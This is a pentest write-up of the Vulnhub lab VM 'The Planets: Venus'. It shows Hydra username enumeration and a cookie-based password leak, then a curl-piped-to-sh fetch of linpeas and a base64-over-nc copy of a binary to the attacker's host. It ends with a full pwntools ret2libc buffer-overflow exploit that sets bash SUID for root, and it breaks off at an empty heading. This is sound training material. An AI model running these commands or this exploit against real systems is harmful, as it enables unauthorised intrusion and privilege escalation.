---
title: Vulnhub, The Planets, Venus
date: Thu Aug 15 05:21:41 PM EDT 2024
categories: [PentestNotes]
tags: [vulnhub,reversing,pwn,cve-2021-4034]
---

## About Release

- **Name**: The Planets: Venus
- **Date release**: 3 Jun 2021
- **Author**: [SirFlash](https://www.vulnhub.com/author/sirflash,731/)
- **Series**: [The Planets](https://www.vulnhub.com/series/the-planets,362/)
## Download

- **Venus.ova** (Size: 1.5 GB)
- **Download (Mirror)**: [https://download.vulnhub.com/theplanets/Venus.ova](https://download.vulnhub.com/theplanets/Venus.ova)
## Description

**Difficulty**: Medium

Venus is a medium box requiring more knowledge than the previous box, "Mercury", in this series. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com
## Recon

```bash
└─$ ip -4 -brief address show eth0
eth0             UP             10.0.2.15/24

└─$ sudo netdiscover -i eth0 -r 10.0.2.0/24 | tee netdiscover.log
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 10.0.2.1        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.2        52:54:00:12:35:00      1      60  Unknown vendor
 10.0.2.3        08:00:27:64:6e:66      1      60  PCS Systemtechnik GmbH
 10.0.2.19       08:00:27:18:54:5e      1      60  PCS Systemtechnik GmbH
```

{::options parse_block_html="true" /}

<details>

<summary markdown="span">nmap_scan.log</summary>

```log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.19:22
Open 10.0.2.19:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -vvv -sV -sC -Pn" on ip 10.0.2.19
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-21 14:10 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:10
Completed NSE at 14:10, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:10
Completed Parallel DNS resolution of 1 host. at 14:10, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:10
Scanning 10.0.2.19 [2 ports]
Discovered open port 8080/tcp on 10.0.2.19
Discovered open port 22/tcp on 10.0.2.19
Completed Connect Scan at 14:10, 0.00s elapsed (2 total ports)
Initiating Service scan at 14:10
Scanning 2 services on 10.0.2.19
Completed Service scan at 14:11, 91.30s elapsed (2 services on 1 host)
NSE: Script scanning 10.0.2.19.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:11
Completed NSE at 14:12, 0.87s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:12
Completed NSE at 14:12, 1.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:12
Completed NSE at 14:12, 0.00s elapsed
Nmap scan report for 10.0.2.19
Host is up, received user-set (0.00099s latency).
Scanned at 2024-07-21 14:10:27 UTC for 94s

PORT     STATE SERVICE    REASON  VERSION
22/tcp   open  ssh        syn-ack OpenSSH 8.5 (protocol 2.0)
| ssh-hostkey: 
|   256 b03e1c684a31327753e31089d6297850 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB+dV9A80/dgYSig2NEBJYcoRe6VFus7DqjGWjNYjN4FH4e8scrM8P9zuw8EYJTdIjDVeJbersbscUbJTTH3C+w=
|   256 fdb420d0d8da0267a4a548f346e2b90f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEG7ONqJEC7HEEiTZaI+MemunphhJ23BhWM0eLlcL/BJ
8080/tcp open  http-proxy syn-ack WSGIServer/0.2 CPython/3.9.5
|_http-server-header: WSGIServer/0.2 CPython/3.9.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Venus Monitoring Login
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 21 Jul 2024 14:10:32 GMT
|     Server: WSGIServer/0.2 CPython/3.9.5
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 626
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <html>
|     <head>
|     <title>Venus Monitoring Login</title>
|     <style>
|     .aligncenter {
|     text-align: center;
|     label {
|     display:block;
|     position:relative;
|     </style>
|     </head>
|     <body>
|     <h1> Venus Monitoring Login </h1>
|     <h2>Please login: </h2>
|     Credentials guest:guest can be used to access the guest account.
|     <form action="/" method="post">
|     <label for="username">Username:</label>
|     <input id="username" type="text" name="username">
|     <label for="password">Password:</label>
|     <input id="username" type="text" name="password">
|     <input type="submit" value="Login">
|     </form>
|     </body>
|_    </html>

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:12
Completed NSE at 14:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:12
Completed NSE at 14:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:12
Completed NSE at 14:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.39 seconds
```
</details>

{::options parse_block_html="false" /}

## HTTP (8080)

![Writeup.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup.png)

> Creds: `guest:guest`
{: .prompt-tip }

Login as `guest`

![Writeup-1.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-1.png)

We got an `auth` cookie which seems to be Base64:
```bash
└─$ echo "Z3Vlc3Q6dGhyZmc=" | base64 -d
guest:thrfg
```

Password seems to be rot13?

![Writeup-2.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-2.png)

### Directory Enumeration

Enumerate directories:
```bash
└─$ gobuster dir -u http://10.0.2.19:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 24 -c 'auth="Z3Vlc3Q6dGhyZmc="'
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.19:8080
[+] Method:                  GET
[+] Threads:                 24
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Cookies:                 auth="Z3Vlc3Q6dGhyZmc="
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /admin/]
Progress: 4727 / 4727 (100.00%)
===============================================================
Finished
===============================================================
```

Backend is Django (Python)

![Writeup-3.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-3.png)

Django gives 500 on unsuccessful username/password combinations.

### Username Enumeration

If we go back to the `/` login and try invalid username/password, we get `Invalid Username`:

![Writeup-4.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-4.png)

Then valid username and invalid password, we get `Invalid Password`:

![Writeup-5.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-5.png)

This means we are able to enumerate usernames by the login form.

hydra syntax for http-post:
```bash
└─$ hydra -l <username> -P <path/to/passwords> <IP> http-post-form "/route/to/login:username=^USER^&password=^PASS^:<Message If Login Is Incorrect>"
```

By using usernames from `xato-net-10-million-passwords-10000.txt` we found 3 valid users:
```bash
└─$ hydra -L /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -p 'letmein' -s 8080 10.0.2.19 http-post-form "/:username=^USER^&password=^PASS^:Invalid username"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-21 10:58:26
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:10000/p:1), ~6250 tries per task
[DATA] attacking http-post-form://10.0.2.19:8080/:username=^USER^&password=^PASS^:Invalid username
[STATUS] 2872.00 tries/min, 2872 tries in 00:01h, 97128 to do in 00:34h, 16 active
[8080][http-post-form] host: 10.0.2.19   login: guest   password: letmein
[8080][http-post-form] host: 10.0.2.19   login: venus   password: letmein
[8080][http-post-form] host: 10.0.2.19   login: magellan   password: letmein
[STATUS] 2848.67 tries/min, 8546 tries in 00:03h, 91454 to do in 00:33h, 16 active
...
```

Sidetracking, but these users exist in following wordlists from [SecLists](https://github.com/danielmiessler/SecLists) 👀
```bash
└─$ grep -REno '^(magellan|venus|guest)$' /usr/share/seclists/Passwords/* | cut -d':' -f1 | sort | uniq -c | grep '3 /'
      3 /usr/share/seclists/Passwords/bt4-password.txt
      3 /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt
      3 /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
      3 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
      3 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
      3 /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
      3 /usr/share/seclists/Passwords/darkc0de.txt
      3 /usr/share/seclists/Passwords/dutch_passwordlist.txt
      3 /usr/share/seclists/Passwords/Honeypot-Captures/multiplesources-passwords-fabian-fingerle.de.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/Ashley-Madison.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/fortinet-2021_users.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/honeynet2.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/honeynet.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/muslimMatch.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/phpbb-cleaned-up.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/phpbb.txt
      3 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
      3 /usr/share/seclists/Passwords/openwall.net-all.txt
      3 /usr/share/seclists/Passwords/probable-v2-top12000.txt
      3 /usr/share/seclists/Passwords/Software/cain-and-abel.txt
      3 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
      3 /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt
      3 /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
      3 /usr/share/seclists/Passwords/xato-net-10-million-passwords-dup.txt
      3 /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
```

### Leaking Passwords With Cookies

```bash
# Cookie we get when logging as guest
└─$ echo 'Z3Vlc3Q6dGhyZmc=' | base64 -d
guest:thrfg

# Replace guest with venus
└─$ echo -n 'venus:thrfg' | base64
dmVudXM6dGhyZmc=

# Replace your cookie and inspect new cookie sent by server
└─$ echo 'dmVudXM6aXJhaGY=' | base64 -d
venus:irahf

# Check second password
└─$ alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'" # https://stackoverflow.com/a/5442495
└─$ echo irahf | rot13
venus
```

Do the same for the `magellan` user 
```bash
└─$ echo -n 'magellan:thrfg' | base64
bWFnZWxsYW46dGhyZmc=

└─$ echo 'bWFnZWxsYW46aXJhaGZ2bmF0cmJ5YnRsMTk4OQ==' | base64 -d
magellan:irahfvnatrbybtl1989                                                                                                                                                                                      
└─$ echo 'irahfvnatrbybtl1989' | rot13
venusiangeology1989
```

## SSH (22)

### magellan

The credentials didn't work for Django admin page, but we are able to login into ssh!

> Creds: `magellan:venusiangeology1989
{: .prompt-tip }

```bash
[magellan@venus ~]$ ls -alh
total 32K
drwx------. 5 magellan magellan 228 May 21  2021 .
drwxr-xr-x. 4 root     root      35 May 20  2021 ..
lrwxrwxrwx. 1 magellan magellan   9 May 21  2021 .bash_history -> /dev/null
-rw-r--r--. 1 magellan magellan  18 Jan 26  2021 .bash_logout
-rw-r--r--. 1 magellan magellan 141 Jan 26  2021 .bash_profile
-rw-r--r--. 1 magellan magellan 492 Jan 26  2021 .bashrc
drwxrwxr-x. 3 magellan magellan  17 May 20  2021 .cache
-rw-------. 1 magellan magellan  36 May 21  2021 .lesshst
drwx------. 4 magellan magellan  28 May 20  2021 .local
-rw-------. 1 magellan magellan  42 May 20  2021 .python_history
-rw-------. 1 magellan magellan  45 May 21  2021 user_flag.txt
drwxrwxr-x. 4 magellan magellan 109 May 21  2021 venus_monitor_proj
-rw-rw-r--. 1 magellan magellan  38 May 21  2021 .virc
-rw-rw-r--. 1 magellan magellan 218 May 21  2021 .wget-hsts
```

#### User.txt

```bash
[magellan@venus ~]$ cat user_flag.txt
[user_flag_e799a60032068b27b8ff212b57c200b0]
```

### Privilege Escalation (root)

Get `linpeas` and run it. (`tee` to save the output if further required)
```bash
[magellan@venus ~]$ curl 10.0.2.15/lp.sh | sh | tee lp.log
...
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:9080            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      842/python3
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::5355                 :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
...
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x. 1 root root 73K Apr  7  2021 /usr/bin/chage
-rwsr-xr-x. 1 root root 77K Apr  7  2021 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 42K Apr  7  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x. 1 root root 49K Feb 12  2021 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x. 1 root root 32K Jan 28  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x. 1 root root 58K Feb 12  2021 /usr/bin/su
-rwsr-xr-x. 1 root root 37K Feb 12  2021 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x. 1 root root 53K Mar 29  2021 /usr/bin/crontab
---s--x--x. 1 root root 182K Jan 26  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x. 1 root root 32K Jan 30  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rws--x--x. 1 root root 33K Feb 12  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rws--x--x. 1 root root 25K Feb 12  2021 /usr/bin/chsh
-rwsr-xr-x. 1 root root 57K Jan 26  2021 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x. 1 root root 16K Apr 12  2021 /usr/sbin/grub2-set-bootflag (Unknown SUID binary!)
-rwsr-xr-x. 1 root root 16K Apr 20  2021 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 24K Apr 20  2021 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 115K Apr 10  2021 /usr/sbin/mount.nfs
-rwsr-xr-x. 1 root root 24K Jan 28  2021 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-x---. 1 root cockpit-wsinstance 53K May 16  2021 /usr/libexec/cockpit-session (Unknown SUID binary!)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x. 1 root tty 25K Feb 12  2021 /usr/bin/write
-rwx--s--x. 1 root slocate 41K Jan 27  2021 /usr/bin/locate
-rwx--s--x. 1 root utmp 16K Jan 27  2021 /usr/libexec/utempter/utempter
-r-xr-sr-x. 1 root ssh_keys 310K Mar  9  2021 /usr/libexec/openssh/ssh-keysign
-rwxr-sr-x. 1 abrt abrt 16K May 25  2021 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache  --->  CENTOS
```

#### venus_messaging

Nothing eye-catching, but some apps are running locally.

```bash
[magellan@venus ~]$ curl 0:9080 
curl: (1) Received HTTP/0.9 when not allowed
[magellan@venus ~]$ nc 0 9080 # 0 is common for localhost, but did't work for some reason
Ncat: You must specify a host to connect to. QUITTING.
[magellan@venus ~]$ nc 127.0.0.1 9080
Welcome to the Venus messaging service.
To continue, please enter your password:letmein
Incorrect password, closing connection.
^C
```

Ok, looks like we have internal service which wants a password..

`ss` doesn't show the running process, probably because of permissions. If we filter `ps` we can find the relate
```bash
[magellan@venus ~]$ ss -tulnp4 | grep 9080
tcp   LISTEN 0      3            0.0.0.0:9080      0.0.0.0:*
[magellan@venus ~]$ ps aux | grep venus
root         764  0.0  0.0   2384   744 ?        Ss   15:08   0:00 /usr/bin/venus_messaging
magellan     766  0.0  0.1   6904  3096 ?        Ss   15:08   0:00 /bin/bash /usr/bin/venus_monitoring_web.sh
magellan     776  0.0  1.8  45948 36756 ?        S    15:08   0:01 /usr/bin/python3 /home/magellan/venus_monitor_proj/manage.py runserver 0:8080
magellan     842  7.8  2.4 618028 49044 ?        Sl   15:08   9:43 /usr/bin/python3 /home/magellan/venus_monitor_proj/manage.py runserver 0:8080
magellan  109262  0.0  0.0   6140   836 pts/0    S+   17:11   0:00 grep --color=auto venus
```

Using strings we identifed probable password, after trying it it worked. But now we are stuck in infinite loop of `Enter Message`
```bash
[magellan@venus ~]$ strings /usr/bin/venus_messaging  | grep -viE '^(\.|_|GA)|libc|gcc|3g965'
...
accept
strcmp
[]A\A]A^A_
loveandbeauty # <--
Socket creation failed.
setsockopt failed.
...
[magellan@venus ~]$ nc 127.0.0.1 9080
Welcome to the Venus messaging service.
To continue, please enter your password:loveandbeauty
Access granted, you can now send messages to the Venus space station.
Please enter message to be processed:
hallo
Message sent to the Venus space station.
Enter message:
hallo
Message sent to the Venus space station.
Enter message:
^C
```

It's an ELF file, so some Reverse Engineering will be required :/
```bash
[magellan@venus ~]$ file /usr/bin/venus_messaging
/usr/bin/venus_messaging: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=507e0f11fb7b76b7b944cc5799d1cf9723ab4caa, for GNU/Linux 3.2.0, not stripped
```

Download file:
```
[magellan@venus ~]$ base64 /usr/bin/venus_messaging | nc 10.0.2.15 4444
---
└─$ listen > venus_messaging.base64
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.19:45452.
└─$ cat venus_messaging.base64 | base64 -d > venus_messaging.elf
└─$ chmod u+x venus_messaging.elf
```

#### Reverse Engineering

Open the file in Ghidra or other Reverse Engineering software. Im using [ghidra_auto.py](https://gist.github.com/xHacka/10c22906e0819a8ba3f6e44d7bab2f71) to speed up file analysis.
```bash
└─$ ghidra_auto venus_messaging.elf
[*] File Ouput:
        ELF 64-bit LSB executable
        x86-64
        version 1 (SYSV)
        dynamically linked
        interpreter /lib64/ld-linux-x86-64.so.2
        BuildID[sha1]=507e0f11fb7b76b7b944cc5799d1cf9723ab4caa
        for GNU/Linux 3.2.0
        not stripped
[*] Running Analysis...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
openjdk version "21.0.2" 2024-01-16
OpenJDK Runtime Environment (build 21.0.2+13-Debian-2)
OpenJDK 64-Bit Server VM (build 21.0.2+13-Debian-2, mixed mode)
[+] Analysis Complete
[*] Opening Ghidra...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Project Directory: /home/woyag/Desktop/Rooms/Vulnhub/Planets/Venus
[*] Project File: /home/woyag/Desktop/Rooms/Vulnhub/Planets/Venus/venus_messaging.gpr
```

After renaming variables and types main function looks like:
```c
void main(void) {
  int err;
  char *ip;
  ssize_t received_len;
  size_t cmp_result;
  long i;
  undefined8 *puVar1;
  undefined8 message;
  undefined8 local_450;
  undefined8 local_448 [126];
  socklen_t local_54;
  socklen_t local_50;
  undefined4 local_4c;
  sockaddr_in peername;
  sockaddr_in listener;
  int received_len_int;
  int conn;
  int sock;
  char *password;
  
  local_4c = 1;
  local_50 = 0x10;
  local_54 = 0x10;
  message = 0;
  local_450 = 0;
  puVar1 = local_448;
  for (i = 126; i != 0; i = i + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  password = "loveandbeauty";
  sock = socket(2,1,0);
  if (sock == 0) {
    perror("Socket creation failed."); /* WARNING: Subroutine does not return */
    exit(1);
  }
  err = setsockopt(sock,1,0xf,&local_4c,4);
  if (err != 0) {
    perror("setsockopt failed."); /* WARNING: Subroutine does not return */
    exit(1);
  }
  listener.sin_family = 2;
  listener.sin_addr.s_addr = 0;
  listener.sin_port = htons(9080);
  err = bind(sock,(sockaddr *)&listener,0x10);
  if (err < 0) {
    perror("bind failed."); /* WARNING: Subroutine does not return */
    exit(1);
  }
  err = listen(sock,3);
  if (err < 0) {
    perror("listen failed."); /* WARNING: Subroutine does not return */
    exit(1);
  }
  printf("Listening on port %d\n",0x2378);
  do {
    conn = accept(sock,(sockaddr *)&listener,&local_50);
    if (conn < 0) {
      perror("accept failed."); /* WARNING: Subroutine does not return */
      exit(1);
    }
    getpeername(conn,(sockaddr *)&peername,&local_54);
    ip = inet_ntoa(peername.sin_addr);
    printf("Accepted connection from %s\n",ip);
    send(conn,"Welcome to the Venus messaging service.\nTo continue, please enter your password:",
         0x50,0);
    received_len = recv(conn,&message,0x400,0);
    received_len_int = (int)received_len;
    cmp_result = strcspn((char *)&message,"\n");
    *(undefined *)((long)&message + cmp_result) = 0;
    if (received_len_int == 14) {
      err = strcmp(password,(char *)&message);
      if (err != 0) goto LAB_00401471;
      send(conn,
           "Access granted, you can now send messages to the Venus space station.\nPlease enter mess age to be processed:\n"
           ,0x6c,0);
      puts("User authenticated.");
    }
    else {
LAB_00401471:
      send(conn,"Incorrect password, closing connection.\n",0x28,0);
      puts("Incorrect password sent by user.");
      close(conn);
    }
    do {
      err = recv_message(conn);
    } while (err != 0);
    puts("Connection closed.");
  } while( true );
}
```

> **Note**: `L` -> rename variable, `Ctrl+L` -> change type, `Ctrl+Z` -> Undo, `Ctrl+Y`  -> Redo.
{: .prompt-info }

Program first authenticates us and then puts us in infinite loop of `recv_message(conn)`

```c
bool recv_message(int conn) {
  int received_len_int;
  ssize_t received_len;
  long i;
  undefined8 *puVar1;
  undefined8 local_418;       //
  undefined8 local_410;       // Probably same buffer 
  undefined8 local_408 [127]; // 
  int received_len_int2;
  
  local_418 = 0;
  local_410 = 0;
  puVar1 = local_408;
  for (i = 126; i != 0; i = i + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  received_len = recv(conn,&local_418,0x800,0); // Message (max len=0x800) is written into 128byte buffer
  received_len_int = (int)received_len;
  if (0 < received_len_int) {
    received_len_int2 = received_len_int;
    *(undefined *)((long)&local_418 + (long)(received_len_int + -1)) = 0;
    puts("Message received:");
    puts((char *)&local_418);
    send(conn,"Message sent to the Venus space station.\nEnter message:\n",0x38,0);
    puts("Message acknowledgement sent.");
  }
  return 0 < received_len_int;
}
```

Smells like Buffer Overflow
```bash
└─$ pwn checksec --file=./venus_messaging.elf
[*] '/home/woyag/Desktop/Rooms/Vulnhub/Planets/Venus/venus_messaging.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### Buffer Overflow

First we need to find BoF point.

```bash
└─$ gdb ./venus_messaging.elf
pwndbg> run
...
---
└─$ nc 0 9080
---
└─$ pwn cyclic 2000 | clip
```

> **Note**: [pwndbg](https://github.com/pwndbg/pwndbg) is being used.
{: .prompt-info }

![Writeup-6.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-6.png)

Get RSP value offset
```bash
└─$ pwn cyclic -l maaknaak
1048
```

_So at 1040 bytes the buffer starts to overflow and overwrites RBP and at **1048** we overwrite the **RSP**. The RSP points to the memory address where the program continues execution, so if we control the RSP we could point to a memory address we control and continue execution there, for example place some shellcode in the first 1048 bytes we send and then point the RSP to this address but this method would not work in this case as the stack is not executable._ (NX:       NX enabled)

The technique we can use is [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc), because fortunately (or not) the ASLR is disabled:
```bash
[magellan@venus ~]$ cat /proc/sys/kernel/randomize_va_space
0
[magellan@venus ~]$ ldd /usr/bin/venus_messaging
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000)
[magellan@venus ~]$ ldd /usr/bin/venus_messaging
        linux-vdso.so.1 (0x00007ffff7fc9000)
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7dee000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcb000
```

![Writeup-7.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-7.png)

> Post: [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc)
{: .prompt-info }

```bash
[magellan@venus ~]$ readelf -s /lib64/libc.so.6 | grep system
  1466: 000000000004a450    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

![Writeup-8.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-8.png)

```bash
[magellan@venus ~]$ strings -a -t x /lib64/libc.so.6 | grep /bin/sh
 18db66 /bin/sh
```

![Writeup-9.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-9.png)

```bash
└─$ ropper --file ./venus_messaging.elf --search "pop rdi"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./venus_messaging.elf
0x00000000004015e3: pop rdi; ret;
```

![Writeup-10.png](/assets/images/Vulnhub/The-Planets-Venus/Writeup-10.png)

```python
#!/usr/bin/env python3

from pwn import *

# context.log_level = 'DEBUG'
binary = context.binary = ELF('./venus_messaging.elf')

io = remote('localhost', 9080)
if args.REMOTE:
    libc = ELF('./libc.so.6')
    libc.address = 0x00007ffff7dee000
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    libc.address = 0x00007ffff7dc3000

offset = 1048
fd = 4
command = b'chmod u+s /bin/bash'

pop_rdi = next(binary.search(asm('pop rdi; ret')))
pop_rsi = next(libc.search(asm('pop rsi; ret')))
pop_rdx_rcx_rbx = next(libc.search(asm('pop rdx; pop rcx; pop rbx; ret')))

payload = flat(
    asm('nop') * offset,    # Padding to overflow buffer and reach return address
    p64(pop_rdi),           # Address of `pop rdi; ret`
    p64(fd),                # File descriptor (first argument for `recv`)
    p64(pop_rsi),           # Address of `pop rsi; ret`
    p64(binary.bss()),      # Address of `.bss` section (second argument for `recv`)
    p64(pop_rdx_rcx_rbx),   # Address of `pop rdx; pop rcx; pop rbx; ret`
    p64(len(command)),      # Length of the command (third argument for `recv`)
    p64(0),                 # Dummy value for `rcx`
    p64(0),                 # Dummy value for `rbx`
    p64(binary.plt.recv),   # Address of `recv` function
    p64(pop_rdi),           # Address of `pop rdi; ret`
    p64(binary.bss()),      # Address of `.bss` section (first argument for `system`)
    p64(libc.sym.system),   # Address of `system` function
)
 
io.sendlineafter(b'password:', b'loveandbeauty')
io.sendlineafter(b'processed:\n', payload)
sleep(0.1)
io.send(command)
io.stream()
```

> **Source**: [https://github.com/datajerk/ctf-write-ups/tree/master/vulnhub/venus](https://github.com/datajerk/ctf-write-ups/tree/master/vulnhub/venus)
{: .prompt-info }

##### Buffer Overflow Explained

